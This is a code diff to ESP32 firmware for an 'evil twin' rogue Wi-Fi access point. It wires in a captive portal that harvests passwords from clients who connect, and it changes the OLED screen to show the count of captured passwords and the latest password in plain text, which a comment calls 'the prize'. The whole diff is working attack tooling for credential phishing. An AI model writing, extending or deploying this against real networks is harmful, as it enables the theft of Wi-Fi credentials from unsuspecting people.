@@ -1,8 +1,10 @@
 #include "wifi_ap.h"
 #include "wifi_scan.h"
+#include "captive_portal.h"
 #include "ssd1306.h"
 #include "esp_wifi.h"
 #include "esp_event.h"
+#include "esp_netif.h"
 #include "esp_log.h"
 #include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
@@ -77,6 +79,15 @@ static void on_client_disconnect(void *arg, esp_event_base_t base,
 
 void wifi_ap_init(void) {
     if (!client_mutex) client_mutex = xSemaphoreCreateMutex();
+
+    // Create default AP netif so DHCP serves IPs to connected clients —
+    // captive portal HTTP server depends on this.
+    static bool netif_created = false;
+    if (!netif_created) {
+        esp_netif_create_default_wifi_ap();
+        netif_created = true;
+    }
+
     ESP_LOGI(TAG, "AP module ready");
 }
 
@@ -157,11 +168,18 @@ void wifi_ap_select(void) {
     memset(clients, 0, sizeof(clients));
     xSemaphoreGive(client_mutex);
 
+    // Give the AP netif a moment to settle, then bring up the captive portal
+    vTaskDelay(pdMS_TO_TICKS(300));
+    captive_portal_start(ap_ssid);
+
     state = AP_STATE_RUNNING;
     ESP_LOGI(TAG, "Evil twin up: \"%s\" ch%u", ap_ssid, ap_channel);
 }
 
 void wifi_ap_stop(void) {
+    // Tear down captive portal BEFORE stopping WiFi so sockets close cleanly
+    captive_portal_stop();
+
     esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_AP_STACONNECTED,
                                   on_client_connect);
     esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_AP_STADISCONNECTED,
@@ -236,35 +254,49 @@ static void render_running(void) {
     memcpy(snap, clients, sizeof(ap_client_t) * count);
     xSemaphoreGive(client_mutex);
 
-    // Row 2: IP address
-    ssd1306_draw_string(0, 2, "IP: " AP_IP);
+    uint8_t cap_count = captive_portal_get_count();
 
-    // Row 3: channel + client count
+    // Row 2: IP
+    ssd1306_draw_string(0, 2, AP_IP);
+
+    // Row 3: channel + counts
     char line[24];
-    snprintf(line, sizeof(line), "Ch:%-2u  %u cli", ap_channel, count);
+    snprintf(line, sizeof(line), "Ch:%-2u c:%u pw:%u",
+             ap_channel, count, cap_count);
     ssd1306_draw_string(0, 3, line);
 
-    // Rows 4–6: connected clients (last 3 MAC bytes + age indicator)
-    if (count == 0) {
-        ssd1306_draw_string(0, 4, " Waiting...");
-    } else {
-        int64_t now = esp_timer_get_time();
-        for (uint8_t i = 0; i < count && i < 3; i++) {
-            int64_t raw_age = (now - snap[i].connected_at_us) / 1000000LL;
-            if (raw_age < 0) raw_age = 0;
-            uint32_t age_s = (uint32_t)raw_age;
-            char age[8];
-            if (age_s < 60) {
-                snprintf(age, sizeof(age), "%2us", (unsigned)(age_s % 100));
-            } else {
-                snprintf(age, sizeof(age), "%2um", (unsigned)((age_s / 60) % 100));
-            }
-            snprintf(line, sizeof(line), " %02X:%02X:%02X %s%s",
-                     snap[i].mac[3], snap[i].mac[4], snap[i].mac[5],
-                     age_s < NEW_CLIENT_SECS ? "[NEW]" : "     ",
-                     age);
-            ssd1306_draw_string(0, 4 + i, line);
+    // Row 4: latest captured password (the prize) — replaces first client slot
+    if (cap_count > 0) {
+        const cp_capture_t *cap = captive_portal_get_latest();
+        if (cap) {
+            // "pw:" + up to 13 chars of password fits the 16-char display
+            snprintf(line, sizeof(line), "pw:%.13s", cap->password);
+            ssd1306_draw_string(0, 4, line);
         }
+    } else if (count == 0) {
+        ssd1306_draw_string(0, 4, " Waiting...");
+    }
+
+    // Rows 5–6: clients (last 3 MAC bytes + age). If a password is shown on
+    // row 4, clients start on row 5; otherwise they start on row 4.
+    uint8_t base_row     = (cap_count > 0) ? 5 : 4;
+    uint8_t max_to_show  = (cap_count > 0) ? 2 : 3;
+    int64_t now          = esp_timer_get_time();
+    for (uint8_t i = 0; i < count && i < max_to_show; i++) {
+        int64_t raw_age = (now - snap[i].connected_at_us) / 1000000LL;
+        if (raw_age < 0) raw_age = 0;
+        uint32_t age_s = (uint32_t)raw_age;
+        char age[8];
+        if (age_s < 60) {
+            snprintf(age, sizeof(age), "%2us", (unsigned)(age_s % 100));
+        } else {
+            snprintf(age, sizeof(age), "%2um", (unsigned)((age_s / 60) % 100));
+        }
+        snprintf(line, sizeof(line), " %02X:%02X:%02X %s%s",
+                 snap[i].mac[3], snap[i].mac[4], snap[i].mac[5],
+                 age_s < NEW_CLIENT_SECS ? "[NEW]" : "     ",
+                 age);
+        ssd1306_draw_string(0, base_row + i, line);
     }
 
     ssd1306_draw_string(0, 7, "LN>stop");
